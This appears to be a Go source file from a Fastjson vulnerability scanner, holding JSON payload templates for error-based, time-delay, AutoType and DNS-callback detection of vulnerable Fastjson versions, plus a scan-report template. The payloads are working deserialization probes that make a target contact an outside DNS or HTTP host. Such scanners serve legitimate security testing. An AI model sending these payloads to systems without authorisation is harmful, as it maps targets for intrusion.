package Utils



/** templates.go
*** payload模版 results模版
**/

/* 报错检测 */

var FS_ERR_DETECT = `{"@type": "java.lang.AutoCloseable"`

/* 出网检测 */

var TAR_NET_DETECT = `{"name":{"@type":"java.net.Inet4Address","val":"{{.Variables.DNS}}"}}`

/* 延迟检测 */

var TIME_DETECT = `{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaa{{.Variables.Value}}!"}`

/* AutoType检测 */

var AUTOTYPE_CHECK = `[{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"{{.Variables.DNS}}"}]`

/************************************************
***                  DNS检测                   ***
*************************************************/

// fastjson < 1.2.48

var DNS_DETECT_48 = `
[
    {"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},
    {"@type":"java.io.ByteArrayOutputStream"},
    {"@type":"java.net.InetSocketAddress"{"address":,"val":"48_.{{.Variables.DNS}}"}}
]
`


// 1.2.48 ≤ fastjson ≤ 1.2.68

var DNS_DETECT_68 = `
{
    "a": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.alibaba.fastjson.JSONReader",
        "reader": {
            "@type": "jdk.nashorn.api.scripting.URLReader",
            "url": "http://68_.{{.Variables.DNS}}"
        }
    }
}
`

// 1.2.68 < fastjson ≤ 1.2.83

var DNS_DETECT_80 = `
[
    {
        "@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",
		"x":{
			"@type":"java.net.InetSocketAddress"{"address":,"val":"80_.{{.Variables.DNS}}"}
		}
    },
    {
        "@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",
		"message":{
			"@type":"java.net.InetSocketAddress"{"address":,"val":"83_.{{.Variables.DNS}}"}
		}
    }
]
`

/*----------------------------------------------------------------------------------------------*/

/************************************************
***                 依赖库检测                  ***
*************************************************/

/**
*** 报错探测
**/

var DEPENDENCY_DETECT_BY_ERR = `
{
	"@type":"java.lang.Character"{
		"@type":"java.lang.Class",
		"val":"{{.Variables.Dependency}}"
}
`

var RESULT_OUTPUT = `Scan Result
Target: {{.Variables.Url}}
[+] Fastjson 版本: {{.Variables.Version}}
[+] 网络状态判断: {{.Variables.Netout}}
[+] AutoType 状态: {{.Variables.Autotype}}
[+] 依赖库信息:
	{{range .Dependency}} 
	{{.}}
	{{end}}

<---------------------------------------------->
`